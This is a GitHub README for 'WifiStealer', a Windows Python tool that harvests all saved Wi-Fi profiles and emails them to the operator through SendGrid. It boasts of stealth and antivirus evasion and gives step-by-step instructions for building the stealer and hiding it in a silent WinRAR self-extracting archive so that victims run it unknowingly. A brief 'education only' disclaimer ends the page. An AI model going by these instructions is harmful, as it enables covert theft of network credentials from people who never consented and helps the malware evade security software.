# Wifi Stealer
[![forthebadge made-with-python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)

## Dependencies
* Python3
  - cx_Freeze
  - sendgrid
  - idna
  
* MS Windows (Widnows 10 is preferable) 

## Installation

```
git clone https://github.com/wasfyelbaz/WifiStealer.git
cd "WifiStealer"
pip3 install -r requirements.txt
```

## Features !

* Steals every profiled wifi on the system.
* Stealth with no console window or anything suspicious to the user.
* Send the collected wifi data to your email.
* Obfuscation of the emails stored in the variables.
* Faster than a lightening.
* Undetectable from MS Windows Defender and many many AVs.

## Example

[![Example](https://raw.githubusercontent.com/wasfyelbaz/WifiStealer/main/Example.gif)](https://raw.githubusercontent.com/wasfyelbaz/WifiStealer/main/Example.gif)

Example of embedding the stealer with WinRAR installation.

## Usage

   - SendGrid:
      - Create new account on [sendgrid](https://sendgrid.com/)
      - Make a new sender with a temp mail.
      - Go to *Email API* > *integration Guide* > Choose *WebAPI* > Choose *Python* > Create an API and save it.

   - Building:
      - Run `python3 build.py`
      - Enter the temp mail you created the sender with.
      - Enter the API key you saved.
      - Enter the email that will receive the data.
   
   - Onefile:
      - Select all the files in the *"Build"* dir, then right click it and choose *"WinRar"*.
      - Choose the *"zip"* format.
      - Under *Archiving Options* menu check the *"Create SFX archive"*.
      - Click on the *"Advanced"* tab which is in the top beside the *"General"* tab.
      - Click *"SFX Options.."* button.
      - Click on *"Setup"* tab, then in under the *"Run after extraction"* write the name of the stealer executable.
      - Next, click on *"Modes"*, then check the *"Unpack to temporary folder"*, and under *"silent mode"* choose *"Hide All"*.
      - Next, click on *"Update"* tab, Then Under *"Overwrite mode"* choose *"Overwrite all files"*.
      - Click ok, ok. Now you have a one-file executable !

## Disclaimer

* This tool is for education purposes only, and I am not responsible for your actions !
